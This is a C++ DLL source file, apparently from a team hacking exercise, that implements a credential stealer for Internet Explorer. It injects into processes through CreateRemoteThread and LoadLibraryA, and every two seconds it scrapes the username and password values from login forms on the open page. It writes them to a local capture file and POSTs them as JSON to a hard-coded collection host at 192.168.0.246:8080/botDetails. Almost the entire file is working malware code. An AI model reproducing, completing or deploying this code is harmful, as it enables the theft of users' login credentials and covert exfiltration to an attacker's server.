// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

struct EnumData {
	DWORD dwProcessId;
	HWND hWnd;
};

struct StolenCred{
	CString Site;
	CString User;
	CString Password;
	CString FormAction;
	CString URL;
};



DWORD GetProcessIDByName(wchar_t* ProcessName, DWORD LastPID);
void InjectProcess(DWORD PID);
HWND FindWindowFromProcessId(DWORD dwProcessId);
void CaptureInput(DWORD PID);
DWORD WINAPI ThreadProc(LPVOID lpParam);

DWORD GetLowestProcessIDByName(wchar_t* ProcessName);
HWND GetProcessWindow(wchar_t* ProcessName);
HWND FindWindowFromProcess(HANDLE hProcess);
void OnGetDocInterface(HWND hWnd, LPVOID Data);
void ReadCollection(IHTMLElementCollection* pColl, LPVOID Data);

void SendDataHome(CString ExfiltrateData, CString UID, CString OS);

void WriteLogFile(CString DataBuffer);

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	DWORD resPID;
	DWORD iLastPID = 0;
	DWORD currPID = GetProcessIDByName(L"iexplore.exe", 0);
		switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			//CaptureInput(GetCurrentProcessId());
			//MessageBox(NULL, L"Process Attach", L"Injection", MB_OK);
			CreateThread(NULL, 0, ThreadProc, (LPVOID)currPID, 0, NULL);
			//WriteLogFile(L"Process Attach");
			break;
		case DLL_THREAD_ATTACH:
			//WriteLogFile(L"Thread Attach");
			break;
		case DLL_THREAD_DETACH:
			//WriteLogFile(L"Thread Detach");
			break;
		case DLL_PROCESS_DETACH:
			//WriteLogFile(L"Process Detach");
			break;
	}
	return TRUE;
}

void WriteLogFile(CString DataBuffer)
{
	HANDLE hFile;
	//char DataBuffer[] = "This is some test data to write to the file.";
	DWORD dwBytesToWrite = sizeof(DataBuffer);
	DWORD dwBytesWritten = 0;
	BOOL bErrorFlag = FALSE;
	

	hFile = CreateFile(L"c:\\temp\\output.txt",                // name of the write
		FILE_APPEND_DATA,        // open for writing
		0,                      // do not share
		NULL,                   // default security
		OPEN_ALWAYS,             // create new file only
		FILE_ATTRIBUTE_NORMAL,  // normal file
		NULL);                  // no attr. template

	
	SetFilePointer(hFile, 0, NULL, FILE_END);
	

	bErrorFlag = WriteFile(
		hFile,           // open file handle
		DataBuffer,      // start of data to write
		dwBytesToWrite,  // number of bytes to write
		&dwBytesWritten, // number of bytes that were written
		NULL);            // no overlapped structure

	

	CloseHandle(hFile);

}

void WriteCaptureFile(CString DataBuffer, CString Path)
{
	HANDLE hFile;
	
	LPCWSTR instr = DataBuffer;
	char outstr[500];
	int utf8_len = WideCharToMultiByte(CP_UTF8, 0, instr, -1, outstr, 500, NULL, NULL);

	DWORD dwBytesToWrite = utf8_len;
	DWORD dwBytesWritten = 0;
	BOOL bErrorFlag = FALSE;


	hFile = CreateFile(Path,                // name of the write
		FILE_APPEND_DATA,          // open for writing
		0,                      // do not share
		NULL,                   // default security
		OPEN_ALWAYS,             // create new file only
		FILE_ATTRIBUTE_NORMAL,  // normal file
		NULL);                  // no attr. template



	SetFilePointer(hFile, 0, NULL, FILE_END);

	bErrorFlag = WriteFile(
		hFile,           // open file handle
		outstr,      // start of data to write
		dwBytesToWrite,  // number of bytes to write
		&dwBytesWritten, // number of bytes that were written
		NULL);            // no overlapped structure



	CloseHandle(hFile);

}

DWORD WINAPI ThreadProc(LPVOID lpParam)
{
	DWORD PID = (DWORD)lpParam;

	

	while (true)
	{
		CaptureInput(PID);
		Sleep(2000);
	}
	return 0;
}

void CaptureInput(DWORD PID)
{
	PID = GetProcessIDByName(L"iexplore.exe", 0);
	if (PID > 0)
	{
		HWND CurrWindow = FindWindowFromProcessId(PID);
		TCHAR className[MAX_PATH];
		GetClassName(CurrWindow, className, _countof(className));

		TCHAR Caption[MAX_PATH];
		GetWindowText(CurrWindow, Caption, _countof(Caption));

		HWND IEFrameTab = FindWindowEx(CurrWindow, NULL, L"Frame Tab", NULL);
		HWND IETabWindow = FindWindowEx(IEFrameTab, NULL, L"TabWindowClass", NULL);

		StolenCred Data = {};

		OnGetDocInterface(IETabWindow, &Data);

		CString output;
		CString json;
		CString UID;
		output.Format(L"User: %s\tPass: %s\tSite: %s\tURL: %s\r\n", Data.User, Data.Password, Data.Site, Data.URL);
		json.Format(L"User: %s Pass: %s Site: %s", Data.User, Data.Password, Data.Site);
		UID.Format(L"%d", PID);

		if (Data.User.GetLength() > 0){
			WriteCaptureFile(output, L"c:\\Temp\\capture.txt");
			SendDataHome(json, UID, L"Windows 7");
		}
	}
}

void InjectProcess(DWORD PID)
{
	char* buffer = "C:\\Source\\GitHub\\Haa\\Debug\\HaaDLL32.dll";

	/*
	* Get process handle passing in the process ID.
	*/

	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (process == NULL) {
		printf("Error: the specified process couldn't be found.");
	}

	///*
	//* Get address of the LoadLibrary function.
	//*/
	//LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	//if (addr == NULL) {
	//	printf("Error: the LoadLibraryA function was not found inside kernel32.dll library.");
	//}

	/*
	* Allocate new memory region inside the process's address space.
	*/
	LPVOID arg = (LPVOID)VirtualAllocEx(process, NULL, strlen(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (arg == NULL) {
		printf("Error: the memory could not be allocated inside the chosen process.");
	}

	/*
	* Write the argument to LoadLibraryA to the process's newly allocated memory region.
	*/
	int n = WriteProcessMemory(process, arg, buffer, strlen(buffer), NULL);
	if (n == 0) {
		printf("Error: there was no bytes written to the process's address space.");
	}

	/*
	* Inject our DLL into the process's address space.
	*/
	HANDLE threadID = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, arg, NULL, NULL);
	if (threadID == NULL) {
		printf("Error: the remote thread could not be created.");
	}

	/*
	* Close the handle to the process, because we've already injected the DLL.
	*/
	CloseHandle(process);
}

DWORD GetProcessIDByName(wchar_t* ProcessName, DWORD CurrentPID)
{
	int iCount = 0;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (wcscmp(entry.szExeFile, ProcessName) == 0)
			{
				DWORD PID = entry.th32ProcessID;
				iCount++;
				if (PID > CurrentPID)
				{
					return PID;
				}
			}
		}
	}

	CloseHandle(snapshot);
	return 0;
}

DWORD GetNextLowestProcessIDByName(wchar_t* ProcessName, DWORD LastPID)
{
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;
	DWORD CurrentPID = 100000;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		return 1;
	}


	// Calculate how many process identifiers were returned.

	cProcesses = cbNeeded / sizeof(DWORD);

	// Print the name and process identifier for each process.

	for (i = 0; i < cProcesses; i++)
	{
		if (aProcesses[i] != 0 && aProcesses[i] < CurrentPID && aProcesses[i] > LastPID)
		{
			TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

			// Get a handle to the process.

			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
				PROCESS_VM_READ,
				FALSE, aProcesses[i]);

			// Get the process name.

			if (NULL != hProcess)
			{
				HMODULE hMod;
				DWORD cbNeeded;

				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
					&cbNeeded))
				{
					GetModuleBaseName(hProcess, hMod, szProcessName,
						sizeof(szProcessName) / sizeof(TCHAR));
				}
			}
			CloseHandle(hProcess);

			if (sizeof(szProcessName) > 0 && wcscmp(szProcessName, ProcessName) == 0)
			{
				CurrentPID = aProcesses[i];
			}
		}
	}
	if (CurrentPID != 100000)
		return CurrentPID;
	else
		return 0;
}

BOOL CALLBACK EnumProc(HWND hWnd, LPARAM lParam) {
	// Retrieve storage location for communication data
	EnumData& ed = *(EnumData*)lParam;
	DWORD dwProcessId = 0x0;
	// Query process ID for hWnd
	GetWindowThreadProcessId(hWnd, &dwProcessId);
	// Apply filter - if you want to implement additional restrictions,
	// this is the place to do so.

	//printf_s(strClass);

	if (ed.dwProcessId == dwProcessId) {
		// Found a window matching the process ID

		TCHAR className[MAX_PATH];
		GetClassName(hWnd, className, _countof(className));

		if (_tcscmp(className, _T("IEFrame")) == 0)
		{
			ed.hWnd = hWnd;
			// Report success
			SetLastError(ERROR_SUCCESS);
			// Stop enumeration
			return FALSE;
		}
	}
	// Continue enumeration
	return TRUE;
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam)
{
	TCHAR	buf[100];

	::GetClassName(hwnd, (LPTSTR)&buf, 100);
	if (_tcscmp(buf, _T("Internet Explorer_Server")) == 0)
	{
		*(HWND*)lParam = hwnd;
		return FALSE;
	}
	else
		return TRUE;
};

void OnGetDocInterface(HWND hWnd, LPVOID Data)
{
	CoInitialize(NULL);
	StolenCred& Capture = *(StolenCred*)Data;

	// Explicitly load MSAA so we know if it's installed
	HINSTANCE hInst = ::LoadLibrary(_T("OLEACC.DLL"));
	if (hInst != NULL)
	{
		if (hWnd != NULL)
		{
			HWND hWndChild = NULL;
			// Get 1st document window
			::EnumChildWindows(hWnd, EnumChildProc, (LPARAM)&hWndChild);
			if (hWndChild)
			{
				CComPtr<IHTMLDocument2> spDoc;
				LRESULT lRes;

				UINT nMsg = ::RegisterWindowMessage(_T("WM_HTML_GETOBJECT"));
				::SendMessageTimeout(hWndChild, nMsg, 0L, 0L, SMTO_ABORTIFHUNG, 1000, (PDWORD_PTR)&lRes);

				LPFNOBJECTFROMLRESULT pfObjectFromLresult = (LPFNOBJECTFROMLRESULT)::GetProcAddress(hInst, "ObjectFromLresult");
				//pfObjectFromLresult = (LPFNOBJECTFROMLRESULT)::GetProcAddress(hInst, "ObjectFromLresult");
				if (pfObjectFromLresult != NULL)
				{
					HRESULT hr;
					hr = (*pfObjectFromLresult)(lRes, IID_IHTMLDocument2, 0, (void**)&spDoc);
					if (SUCCEEDED(hr))
					{
						IHTMLElementCollection* pColl = NULL;

						hr = spDoc->get_forms(&pColl);

						if (hr == S_OK && pColl != NULL)
						{
							ReadCollection(pColl, Data);
						}

						pColl->Release();

						BSTR bstr;

						hr = spDoc->get_title(&bstr);
						Capture.Site = bstr;
						hr = spDoc->get_URL(&bstr);
						Capture.URL = bstr;
					}
				}
			} // else document not ready
		} // else Internet Explorer is not running
		::FreeLibrary(hInst);
	} // else Active Accessibility is not installed
	CoUninitialize();
}

void ReadCollection(IHTMLElementCollection* pColl, LPVOID Data)
{
	HRESULT hr;
	StolenCred& Capture = *(StolenCred*)Data;

	LONG celem;
	hr = pColl->get_length(&celem);

	if (hr == S_OK)
	{
		for (int i = 0; i < celem; i++)
		{
			VARIANT varIndex;
			varIndex.vt = VT_UINT;
			varIndex.lVal = i;
			VARIANT var2;
			VariantInit(&var2);
			IDispatch* pDisp;

			hr = pColl->item(varIndex, var2, &pDisp);
			if (hr == S_OK)
			{
				IHTMLElement* pElem;

				hr = pDisp->QueryInterface(IID_IHTMLElement, (void **)&pElem);
				if (hr == S_OK)
				{
					BSTR bstr;
					hr = pElem->get_innerHTML(&bstr);
					CString strTag = bstr;
					IHTMLFormElement* pFrmElem;
					IHTMLInputTextElement* pTxtBox;

					// Is it an form element?
					hr = pDisp->QueryInterface(
						IID_IHTMLFormElement, (void **)&pFrmElem);
					if (hr == S_OK)
					{
						pFrmElem->get_action(&bstr);
						strTag = bstr;
						Capture.FormAction = strTag;
						//MessageBox(NULL, strTag, L"FormAction", MB_OK);
						IDispatch *fDisp;

						hr = pFrmElem->get_elements(&fDisp);
						if (hr == S_OK)
						{

							IHTMLElementCollection* fColl = NULL;
							hr = fDisp->QueryInterface(IID_IHTMLElementCollection, (void **)&fColl);
							if (hr == S_OK)
							{
								ReadCollection(fColl, Data);
							}
						}
						fDisp->Release();
						pFrmElem->Release();
					}
					else
					{
						hr = pDisp->QueryInterface(IID_IHTMLInputTextElement, (void
							**)&pTxtBox);
						if (hr == S_OK)
						{

							pTxtBox->get_name(&bstr);
							strTag = bstr;
							strTag.MakeLower();
							if (strTag.Find(L"user", 0) >= 0 || strTag.Find(L"email", 0) >= 0 || strTag.Find(L"login", 0) >= 0)
							{
								//strTag += " - ";
								pTxtBox->get_value(&bstr);
								strTag = bstr;
								Capture.User = strTag;
								//MessageBox(NULL, strTag, L"Username", MB_OK);

							}
							else if (strTag.Find(L"pass", 0) >= 0)
							{
								pTxtBox->get_value(&bstr);
								strTag = bstr;
								Capture.Password = strTag;
								//MessageBox(NULL, strTag, L"Password", MB_OK);
							}
							pTxtBox->Release();
						}
					}
					pElem->Release();
				}
				pDisp->Release();
			}

			if (!Capture.User.IsEmpty() && !Capture.Password.IsEmpty())
			{
				break;
			}
		}
	}


}

HWND FindWindowFromProcessId(DWORD dwProcessId) {
	EnumData ed = { dwProcessId };
	if (!EnumWindows(EnumProc, (LPARAM)&ed) &&
		(GetLastError() == ERROR_SUCCESS)) {
		return ed.hWnd;
	}
	return NULL;
}

void SendDataHome(CString ExfiltrateData, CString UID, CString OS)
{
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
		WINHTTP_ACCESS_TYPE_NO_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);
	//printf("hSession: %s", hSession);
	//printf("\n");

	// Specify an HTTP server.
	if (hSession){
		hConnect = WinHttpConnect(hSession, L"192.168.0.246", 8080, 0);
		//printf("hConnect: %s", hConnect);
		//printf("\n");
	}


	// Create an HTTP request handle.
	if (hConnect){
		hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/botDetails",
			//hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/file/HAA/malware/DanIsABeauGosse.txt",
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			0);
		//printf("hRequest: %s", hRequest);
		//printf("\n");
	}

	wchar_t* header = L"Content-Type: application/json\r\n";
	//     wchar_t* header = L"Content-Type: multipart/form-data\r\n";

	if (hRequest){
		WinHttpAddRequestHeaders(hRequest, header, (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
		//printf("hRequest: %s", hRequest);
		//printf("\n");
	}

	//char * username="Annaelle Cohen";
	//char* password="RaphaelIsMyLove";
	//char* URL = "israelTechChallenge.com";
	//char str[1024];
	////char* dataString=sprintf(str, "username: %s, password %s, URL:%s", username, password, URL);
	//std::string dataString = std::string("username:");
	//dataString += username;
	//dataString += ", password: ";
	//dataString += password;
	//dataString += ", URL: ";
	//dataString += URL;

	//printf(URL);


	//char * test = dataString.c_str();
	//CString FormatString = " { \"uid\":\"%s\", \"operatingSystem\" : \"%s\", \"other\" : \"%s\", \"teamName\" :\"HAA\" }"; 
	CString JsonData;
	JsonData.Format(L" { \"uid\":\"%s\", \"operatingSystem\" : \"%s\", \"other\" : \"%s\", \"teamName\" :\"HAA\" }", UID, OS, ExfiltrateData);

	LPCWSTR instr = JsonData;
	char outstr[1000];
	int utf8_len = WideCharToMultiByte(CP_UTF8, 0, instr, -1, outstr, 1000, NULL, NULL);

	//WriteLogFile(outstr);

	//std::ifstream ifs("C:\\temp\\test.txt");
	//std::string data((std::istreambuf_iterator<char>(ifs)),
	//     (std::istreambuf_iterator<char>()));

	//char *JsonData = "{ \"data\":%s }",data;
	//printf("%s \n",JsonData);

	// Send a request.
	if (hRequest){
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS, -1L,
			outstr, utf8_len-1,
			utf8_len-1, 0); //+wcslen(header)
		//printf("sendRequest: %d", bResults);
		//printf("\n");
	}



	// End the request.
	if (bResults){
		bResults = WinHttpReceiveResponse(hRequest, NULL);
		printf("ReceiveResponse: %d", bResults);
		printf("\n");
	}
}